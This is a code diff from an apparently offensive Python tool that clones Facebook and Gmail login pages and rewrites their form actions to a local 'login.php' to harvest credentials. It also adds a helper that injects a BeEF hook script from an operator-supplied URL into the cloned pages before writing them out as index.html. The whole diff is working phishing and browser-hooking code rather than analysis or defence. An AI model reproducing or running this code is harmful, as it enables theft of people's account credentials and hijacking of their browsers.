@@ -20,6 +20,7 @@ from Core.Settings import frm_Settings
 from Modules.utils import ProcessThread,Beef_Hook_url
 from os import popen,chdir,getcwd
 from urllib2 import urlopen,URLError
+from BeautifulSoup import BeautifulSoup
 threadloading = {'template':[],'posion':[]}
 class frm_template(QDialog):
     def __init__(self, parent = None):
@@ -146,24 +147,30 @@ class frm_template(QDialog):
     def killThread(self):
         for i in threadloading['template']:
             i.stop(),i.join()
+
+    def CheckHookInjection(self,rasp):
+        if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
+            self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
+            html_final = Beef_Hook_url(rasp,self.hook)
+            if html_final != None:
+                rasp = html_final
+            else: QMessageBox.information(self,'Error Hook Inject Page',
+                'Hook Url not injected, not found tag "<body>"')
+        with open('index.html','w') as f:
+            f.write(str(rasp))
+            f.close()
+        return rasp
+
     def phishing_page(self,choice,sock):
             if choice == 'facebook':
                 path = 'Templates/Phishing/Facebook/'
                 try:
                     chdir(path)
+                    self.html = BeautifulSoup(sock)
+                    self.html.div.form['action'] = 'login.php'
+                    self.CheckHookInjection(self.html)
                 except OSError,e:
                     return QMessageBox.warning(self,'error path',e)
-                self.html = sock.replace('https://www.facebook.com/login.php?login_attempt=1', 'login.php')
-                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                    html_final = Beef_Hook_url(self.html,self.hook)
-                    if html_final != None:
-                        self.html = html_final
-                    else: QMessageBox.information(self,'Error Hook Inject Page',
-                        'Hook Url not injected, not found tag "<body>"')
-                with open('index.html','w') as f:
-                    f.write(str(self.html))
-                    f.close()
             elif choice == 'route':
                 path = 'Templates/Phishing/Route/'
                 chdir(path)
@@ -171,33 +178,16 @@ class frm_template(QDialog):
                 path = 'Templates/Phishing/Custom/'
                 chdir(path)
                 self.html = self.txt_html.toPlainText()
-                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                    html_final = Beef_Hook_url(self.html,self.hook)
-                    if html_final != None:
-                        self.html = html_final
-                    else: QMessageBox.information(self,'Error Hook Inject Page',
-                        'Hook Url not injected, not found tag <body>')
-                with open('index.html','w') as f:
-                    f.write(str(self.html))
-                    f.close()
+                self.CheckHookInjection(self.html)
             elif choice == 'gmail':
                 path = 'Templates/Phishing/Gmail/'
                 try:
                     chdir(path)
                     request = urlopen('http://accounts.google.com/Login?hl').read()
                     self.html = request.replace('//ssl.gstatic.com/accounts/ui/','')
-                    self.html = request.replace('https://accounts.google.com/ServiceLoginAuth','login.php')
-                    if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                        self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                        html_final = Beef_Hook_url(self.html,self.hook)
-                        if html_final != None:
-                            self.html = html_final
-                        else: QMessageBox.information(self,'Error Hook Inject Page',
-                            'Hook Url not injected, not found tag "<body>"')
-                    with open('index.html','w') as f:
-                        f.write(str(self.html))
-                        f.close()
+                    self.html = BeautifulSoup(self.html)
+                    self.html.div.form['action'] = 'login.php'
+                    self.CheckHookInjection(self.html)
                 except OSError,e:
                     return QMessageBox.warning(self,'error path',e)
 
